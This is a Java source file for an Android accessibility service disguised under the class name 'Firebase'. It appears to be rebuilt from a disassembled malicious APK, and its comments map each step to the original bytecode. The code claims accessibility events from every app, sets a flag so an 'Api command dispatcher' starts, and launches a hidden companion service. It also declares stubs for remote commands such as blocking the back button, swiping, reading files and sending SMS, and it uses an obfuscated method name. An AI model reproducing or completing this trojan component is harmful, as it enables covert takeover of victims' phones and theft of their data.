package com.android.pictach;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;

public class Firebase extends AccessibilityService {

    // Static state fields — used by Api command dispatcher
    public static Boolean  FirebaseFOR_IN      = false;
    public static Boolean  FirebaseFOR_prim     = false;
    public static Boolean  Firebasebypass       = false;
    public static String   FirebaseOFK          = "on";
    public static boolean  FirebaseCheckPrims   = false;
    public static String   fileReadStatus       = "on";
    public static boolean  needPaste            = false;
    public static String   pasteText            = "";

    // -------------------------------------------------------------------------
    // onServiceConnected — called by Android when accessibility service binds
    //
    // Confirmed from original APK disassembly (code_off=0xe7084, isz=176):
    //   [0]   invoke-super onServiceConnected
    //   [3]   new AccessibilityServiceInfo, set flags/eventTypes/feedbackType
    //   [24]  setServiceInfo(info)
    //   [27]  love.MyAccess = this
    //   [118] const-class love → LoveApi0.illacarterith(love, getApplication())
    //   [128] if that returns false → skip startService(love)
    //   [130] if true → startService(love)
    //   [140] if SDK >= 26 → startForegroundService(myker) else startService(myker)
    //   [175] return-void
    //
    // In this source build:
    //   - body.IP_body_I check (units 70-94) always returns false → skipped (dead code)
    //   - myker is NOT in AndroidManifest → do not start it
    //   - love.allok must be set true before love.onStartCommand runs
    //     so Api starts correctly
    //   - LoveApi0.illacarterith checks if love is already running;
    //     if not running → start it
    // -------------------------------------------------------------------------
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        // Set up AccessibilityServiceInfo — mirrors original APK units [3-24]
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags         = 19;   // original: const/16 v1, 19
            info.eventTypes    = 0xF;  // original: const/4 v1, 15 → all event types
            info.notificationTimeout = 0L; // original: iput-wide 0
            info.packageNames  = null; // original: iput-object null → all packages
            info.feedbackType  = 0xF;  // original: iput v1 (same as eventTypes)
            setServiceInfo(info);
        } catch (Exception ignored) {}

        // Set accessibility instance on love — original APK unit [27]
        // sput-object v9, love.MyAccess
        love.MyAccess = this;

        // Set allok = true so love.onStartCommand passes its guard
        // and starts Api — this is what was missing from the source
        love.allok = true;

        // Check if love service is already running — original APK units [118-137]
        // LoveApi0.illacarterith(love.class, getApplication())
        // returns false if love IS running (no need to start again)
        // returns true if love is NOT running (need to start it)
        try {
            boolean loveNotRunning = LoveApi0.illacarterithomsonwtranskschemeijohnstontscreeningnglennomaybehoptimizeelikelyfcopxchallengeh49(
                    love.class, getApplication());
            if (loveNotRunning) {
                startService(new Intent(this, love.class));
            }
        } catch (Exception ignored) {}
    }

    // -------------------------------------------------------------------------
    // Required AccessibilityService overrides
    // -------------------------------------------------------------------------
    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {}

    @Override
    public void onInterrupt() {}

    // -------------------------------------------------------------------------
    // Methods called by Api command dispatcher
    // All were empty/stub in original source — kept identical
    // -------------------------------------------------------------------------
    public void blockBackButton() {}
    public void goHome() {}
    public void triggerAction() {}
    public void performSwipe(String s) {}
    public void drawSwipePath(android.graphics.Point[] pts, int dur) {}
    public String readFile(String path) { return ""; }
    public static void sendSMS(String num, String msg) {}
}
